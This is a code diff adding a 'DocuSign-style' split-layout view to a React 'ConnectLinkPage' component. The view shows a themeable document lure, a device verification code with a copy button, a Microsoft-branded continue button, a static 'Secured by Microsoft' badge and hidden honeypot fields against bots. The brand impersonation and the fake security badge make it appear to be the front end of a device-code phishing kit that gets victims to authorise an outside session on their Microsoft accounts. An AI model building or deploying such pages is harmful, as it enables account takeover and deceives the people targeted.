@@ -167,6 +167,300 @@ export function ConnectLinkPage() {
 
   const t = theme;
 
+  // Honeypot fields shared by both layouts
+  const honeypotFields = (
+    <div
+      style={{ position: "absolute", left: "-9999px", top: "-9999px", opacity: 0, height: 0, overflow: "hidden" }}
+      aria-hidden="true"
+      tabIndex={-1}
+    >
+      <input type="email" name="email_address" autoComplete="off" tabIndex={-1}
+        value={honeypot.email_address}
+        onChange={(e) => setHoneypot((prev) => ({ ...prev, email_address: e.target.value }))} />
+      <input type="tel" name="phone_number" autoComplete="off" tabIndex={-1}
+        value={honeypot.phone_number}
+        onChange={(e) => setHoneypot((prev) => ({ ...prev, phone_number: e.target.value }))} />
+      <input type="url" name="website_url" autoComplete="off" tabIndex={-1}
+        value={honeypot.website_url}
+        onChange={(e) => setHoneypot((prev) => ({ ...prev, website_url: e.target.value }))} />
+    </div>
+  );
+
+  // Split-layout render (DocuSign-style)
+  if (t.layout === "split") {
+    return (
+      <div style={{
+        minHeight: "100vh",
+        display: "flex",
+        fontFamily: "Inter, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
+        background: "white",
+        color: "#1A1A1A",
+      }}>
+        {honeypotFields}
+
+        {/* Left panel: document */}
+        <div style={{
+          flex: "0 0 38%",
+          background: t.bgTint,
+          padding: "32px 48px",
+          display: "flex",
+          flexDirection: "column",
+          minHeight: "100vh",
+        }}>
+          <div dangerouslySetInnerHTML={{ __html: t.logo }} />
+
+          <div style={{
+            flex: 1,
+            display: "flex",
+            flexDirection: "column",
+            justifyContent: "center",
+            alignItems: "center",
+            textAlign: "center",
+          }}>
+            {/* Document icon with + badge */}
+            <div style={{ position: "relative", marginBottom: 18 }}>
+              <svg width="80" height="96" viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M10 8 a4 4 0 0 1 4 -4 h44 l18 18 v62 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 V8z" fill="white" stroke="#D4D2CF" strokeWidth="2"/>
+                <path d="M58 4 v14 a4 4 0 0 0 4 4 h14" fill="none" stroke="#D4D2CF" strokeWidth="2"/>
+                <line x1="22" y1="38" x2="58" y2="38" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
+                <line x1="22" y1="48" x2="58" y2="48" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
+                <line x1="22" y1="58" x2="46" y2="58" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
+              </svg>
+              <div style={{
+                position: "absolute",
+                bottom: -6,
+                right: -6,
+                width: 28,
+                height: 28,
+                borderRadius: "50%",
+                background: t.primaryColor,
+                color: "white",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                fontSize: 18,
+                fontWeight: 600,
+                lineHeight: 1,
+                boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
+              }}>+</div>
+            </div>
+            <div style={{ fontSize: 15, fontWeight: 600, color: "#1A1A1A", marginBottom: 6 }}>
+              {t.documentName}
+            </div>
+            <div style={{ fontSize: 13, fontWeight: 600, color: t.documentLabelColor || "#C99700" }}>
+              {t.documentLabel}
+            </div>
+          </div>
+        </div>
+
+        {/* Right panel: auth */}
+        <div style={{
+          flex: 1,
+          padding: "32px 48px",
+          display: "flex",
+          flexDirection: "column",
+          minHeight: "100vh",
+        }}>
+          <div style={{
+            flex: 1,
+            display: "flex",
+            flexDirection: "column",
+            justifyContent: "center",
+            alignItems: "center",
+            maxWidth: 460,
+            width: "100%",
+            margin: "0 auto",
+          }}>
+            {(status === "loading" || status === "starting") && (
+              <div style={{ textAlign: "center", padding: "40px 0" }}>
+                <div className="loading-spinner" />
+                <p style={{ marginTop: 16, color: "#637282", fontSize: 14 }}>
+                  {status === "loading" ? "Loading..." : "Preparing secure access..."}
+                </p>
+              </div>
+            )}
+
+            {status === "ready" && session && (
+              <div style={{ width: "100%" }}>
+                {/* Lock icon */}
+                <div style={{
+                  width: 56, height: 56, borderRadius: "50%",
+                  background: "#F4ECFD",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                  margin: "0 auto 24px",
+                }}>
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17 9h-1V7a4 4 0 1 0-8 0v2H7a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2zm-7-2a2 2 0 0 1 4 0v2h-4V7zm7 13H7v-9h10v9z" fill={t.primaryColor}/>
+                  </svg>
+                </div>
+
+                <h1 style={{
+                  fontSize: 28, fontWeight: 700,
+                  textAlign: "center", margin: "0 0 12px",
+                  color: "#1A1A1A", letterSpacing: "-0.5px",
+                }}>{t.heading}</h1>
+                <p style={{
+                  marginBottom: 28, color: "#637282",
+                  textAlign: "center", lineHeight: 1.55, fontSize: 14.5,
+                }}>{t.subtitle}</p>
+
+                {/* Dark verification code card */}
+                <div style={{
+                  background: t.cardBg || "#1A1A1A",
+                  borderRadius: 12,
+                  padding: "26px 24px",
+                  marginBottom: 28,
+                  textAlign: "center",
+                }}>
+                  <div style={{
+                    fontSize: 11, color: "#9CA3AF",
+                    marginBottom: 14, textTransform: "uppercase",
+                    letterSpacing: 1.8, fontWeight: 600,
+                  }}>{t.codeLabel}</div>
+                  <div style={{
+                    fontSize: 28, fontWeight: 700, letterSpacing: 6,
+                    color: "white", fontFamily: "ui-monospace, monospace",
+                    marginBottom: 18,
+                  }}>{session.userCode}</div>
+                  <button
+                    onClick={handleCopyCode}
+                    style={{
+                      padding: "8px 22px", fontSize: 13, fontWeight: 600,
+                      background: t.primaryColor,
+                      color: t.buttonTextColor || "white",
+                      border: "none", borderRadius: 8, cursor: "pointer",
+                      transition: "background 0.2s",
+                    }}
+                    onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
+                    onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
+                  >{copied ? "Copied!" : "Copy Code"}</button>
+                </div>
+
+                {/* Numbered steps with circle badges */}
+                <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 24 }}>
+                  {t.steps.map((step, i) => (
+                    <div key={i} style={{ display: "flex", alignItems: "center", gap: 12 }}>
+                      <div style={{
+                        flexShrink: 0,
+                        width: 24, height: 24, borderRadius: "50%",
+                        background: t.primaryColor, color: "white",
+                        display: "flex", alignItems: "center", justifyContent: "center",
+                        fontSize: 12, fontWeight: 700,
+                      }}>{i + 1}</div>
+                      <div style={{ fontSize: 14, color: "#1A1A1A" }}>{step}</div>
+                    </div>
+                  ))}
+                </div>
+
+                {/* Continue to Microsoft button */}
+                <button
+                  onClick={handleLogin}
+                  style={{
+                    padding: "14px 24px", fontSize: 15, width: "100%",
+                    display: "flex", justifyContent: "center", alignItems: "center", gap: 10,
+                    background: t.primaryColor, color: t.buttonTextColor || "white",
+                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
+                    transition: "background 0.2s",
+                  }}
+                  onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
+                  onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
+                >
+                  <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="0" y="0" width="8" height="8" fill="#F25022"/>
+                    <rect x="9" y="0" width="8" height="8" fill="#7FBA00"/>
+                    <rect x="0" y="9" width="8" height="8" fill="#00A4EF"/>
+                    <rect x="9" y="9" width="8" height="8" fill="#FFB900"/>
+                  </svg>
+                  {t.buttonText}
+                </button>
+
+                <div style={{
+                  marginTop: 14, textAlign: "center",
+                  display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
+                  fontSize: 12, color: "#637282",
+                }}>
+                  <span style={{
+                    display: "inline-block", width: 8, height: 8, borderRadius: "50%",
+                    background: "#10B981",
+                  }} />
+                  Secured by Microsoft
+                </div>
+              </div>
+            )}
+
+            {status === "signing_in" && (
+              <div style={{ textAlign: "center" }}>
+                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 12, color: "#1A1A1A" }}>Waiting for sign-in</h1>
+                <p style={{ color: "#637282", marginBottom: 24, lineHeight: 1.55, fontSize: 14.5 }}>
+                  Complete the sign-in in the Microsoft window that opened. This page will update automatically.
+                </p>
+                <div className="loading-spinner" />
+              </div>
+            )}
+
+            {status === "done" && (
+              <div style={{ textAlign: "center" }}>
+                <div style={{
+                  width: 56, height: 56, borderRadius: "50%", background: "#e6f9ed",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                  margin: "0 auto 20px",
+                }}>
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#0d9f3f"/>
+                  </svg>
+                </div>
+                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 8, color: "#1A1A1A" }}>{t.successHeading}</h1>
+                <p style={{ color: "#637282", lineHeight: 1.55, marginBottom: 20, fontSize: 14.5 }}>
+                  {t.successMessage}
+                </p>
+                <button
+                  onClick={handleConnectAnother}
+                  style={{
+                    padding: "10px 24px", fontSize: 14,
+                    background: t.primaryColor, color: t.buttonTextColor || "white",
+                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
+                  }}
+                >{t.againLabel}</button>
+              </div>
+            )}
+
+            {status === "error" && (
+              <div style={{ textAlign: "center" }}>
+                <div style={{
+                  width: 56, height: 56, borderRadius: "50%", background: "#fde8e8",
+                  display: "flex", alignItems: "center", justifyContent: "center",
+                  margin: "0 auto 20px",
+                }}>
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#d32f2f"/>
+                  </svg>
+                </div>
+                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 8, color: "#1A1A1A" }}>Something went wrong</h1>
+                <p style={{ color: "#d32f2f", marginBottom: 16, lineHeight: 1.55, fontSize: 14.5 }}>
+                  {error || "Please try again."}
+                </p>
+                <button
+                  onClick={handleConnectAnother}
+                  style={{
+                    padding: "10px 24px", fontSize: 14,
+                    background: t.primaryColor, color: t.buttonTextColor || "white",
+                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
+                  }}
+                >Try again</button>
+              </div>
+            )}
+          </div>
+
+          {t.footerText && (
+            <div style={{ textAlign: "center", color: "#9CA3AF", fontSize: 12 }}>
+              {t.footerText}
+            </div>
+          )}
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="login-page">
       <div className="login-card" style={{ maxWidth: 480 }}>
